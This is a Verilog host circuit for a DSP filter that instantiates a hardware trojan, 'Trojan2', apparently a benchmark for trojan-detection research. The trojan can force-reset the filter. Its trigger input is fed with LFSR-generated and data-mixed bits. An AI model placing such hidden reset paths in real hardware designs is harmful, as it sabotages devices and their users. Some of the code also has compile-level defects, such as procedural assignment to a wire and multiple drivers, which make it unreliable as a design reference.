// DSP Host Circuit for Trojan2
// Fixed I/O to match Trojan2: clk, rst, data_in[7:0] -> force_reset
module trojan2_dsp_host #(
    parameter DATA_WIDTH = 16,    // DSP data width
    parameter COEFF_WIDTH = 12,   // Coefficient width
    parameter TAP_COUNT = 8,      // Number of filter taps
    parameter [29:0] DSP_PATTERN = 30'h15FACADE  // Pattern for data generation
)(
    input wire clk,
    input wire rst,
    input wire [DATA_WIDTH-1:0] data_in,
    input wire data_valid,
    input wire [COEFF_WIDTH-1:0] coeff_0,
    input wire [COEFF_WIDTH-1:0] coeff_1,
    input wire [COEFF_WIDTH-1:0] coeff_2,
    input wire [COEFF_WIDTH-1:0] coeff_3,
    output reg [DATA_WIDTH-1:0] filtered_out,
    output reg output_valid,
    output reg filter_ready
);

    // Trojan interface (fixed width)
    wire [7:0] trojan_data_in;
    wire trojan_force_reset;
    
    // DSP filter structures
    reg [DATA_WIDTH-1:0] delay_line [0:TAP_COUNT-1];
    reg [DATA_WIDTH+COEFF_WIDTH:0] accumulator;
    reg [29:0] pattern_gen;
    reg [2:0] dsp_state;
    reg [3:0] tap_index;
    reg [2:0] pattern_sel;
    
    // Data generation for trojan
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            pattern_gen <= DSP_PATTERN;
            pattern_sel <= 3'b000;
        end else if (data_valid || output_valid) begin
            pattern_gen <= {pattern_gen[28:0], pattern_gen[29] ^ pattern_gen[26] ^ pattern_gen[19] ^ pattern_gen[6]};
            pattern_sel <= pattern_sel + 1;
        end
    end
    
    // Select data for trojan based on DSP operations
    always @(*) begin
        case (pattern_sel)
            3'b000: trojan_data_in = pattern_gen[7:0];
            3'b001: trojan_data_in = pattern_gen[15:8];
            3'b010: trojan_data_in = pattern_gen[23:16];
            3'b011: trojan_data_in = pattern_gen[29:22];
            3'b100: trojan_data_in = pattern_gen[7:0] ^ data_in[7:0];
            3'b101: trojan_data_in = pattern_gen[15:8] ^ data_in[DATA_WIDTH-1:DATA_WIDTH-8];
            3'b110: trojan_data_in = pattern_gen[23:16] ^ coeff_0[7:0];
            3'b111: trojan_data_in = pattern_gen[29:22] ^ coeff_1[7:0];
            default: trojan_data_in = 8'h00;
        endcase
    end
    
    // DSP filter state machine
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            dsp_state <= 3'b000;
            tap_index <= 4'h0;
            accumulator <= {(DATA_WIDTH+COEFF_WIDTH+1){1'b0}};
            filter_ready <= 1'b1;
            output_valid <= 1'b0;
        end else if (trojan_force_reset) begin
            // Synchronous reset from trojan
            dsp_state <= 3'b000;
            tap_index <= 4'h0;
            accumulator <= {(DATA_WIDTH+COEFF_WIDTH+1){1'b0}};
            filter_ready <= 1'b1;
            output_valid <= 1'b0;
        end else begin
            case (dsp_state)
                3'b000: begin // IDLE
                    filter_ready <= 1'b1;
                    output_valid <= 1'b0;
                    if (data_valid) begin
                        // Shift delay line
                        delay_line[0] <= data_in;
                        accumulator <= {(DATA_WIDTH+COEFF_WIDTH+1){1'b0}};
                        tap_index <= 4'h0;
                        dsp_state <= 3'b001;
                        filter_ready <= 1'b0;
                    end
                end
                3'b001: begin // SHIFT_DELAY
                    // Continue shifting delay line
                    if (tap_index < 4'(TAP_COUNT-1)) begin
                        delay_line[tap_index[2:0]+1] <= delay_line[tap_index[2:0]];
                        tap_index <= tap_index + 1;
                    end else begin
                        tap_index <= 4'h0;
                        dsp_state <= 3'b010;
                    end
                end
                3'b010: begin // MAC_OPERATION
                    // Multiply-accumulate operations
                    case (tap_index)
                        4'h0: accumulator <= accumulator + (delay_line[0] * coeff_0);
                        4'h1: accumulator <= accumulator + (delay_line[1] * coeff_1);
                        4'h2: accumulator <= accumulator + (delay_line[2] * coeff_2);
                        4'h3: accumulator <= accumulator + (delay_line[3] * coeff_3);
                        4'h4: accumulator <= accumulator + (delay_line[4] * coeff_0);
                        4'h5: accumulator <= accumulator + (delay_line[5] * coeff_1);
                        4'h6: accumulator <= accumulator + (delay_line[6] * coeff_2);
                        4'h7: accumulator <= accumulator + (delay_line[7] * coeff_3);
                        default: accumulator <= accumulator;
                    endcase
                    
                    if (tap_index >= 4'(TAP_COUNT-1)) begin
                        dsp_state <= 3'b011;
                    end else begin
                        tap_index <= tap_index + 1;
                    end
                end
                3'b011: begin // OUTPUT
                    filtered_out <= accumulator[DATA_WIDTH+COEFF_WIDTH-1:COEFF_WIDTH];
                    output_valid <= 1'b1;
                    dsp_state <= 3'b000;
                end
                default: dsp_state <= 3'b000;
            endcase
        end
    end
    
    // Initialize delay line
    integer i;
    always @(posedge rst or posedge trojan_force_reset) begin
        if (rst || trojan_force_reset) begin
            for (i = 0; i < TAP_COUNT; i = i + 1) begin
                delay_line[i] <= {DATA_WIDTH{1'b0}};
            end
        end
    end
    
    // Instantiate Trojan2
    Trojan2 trojan_inst (
        .clk(clk),
        .rst(rst),
        .data_in(trojan_data_in),
        .force_reset(trojan_force_reset)
    );

endmodule

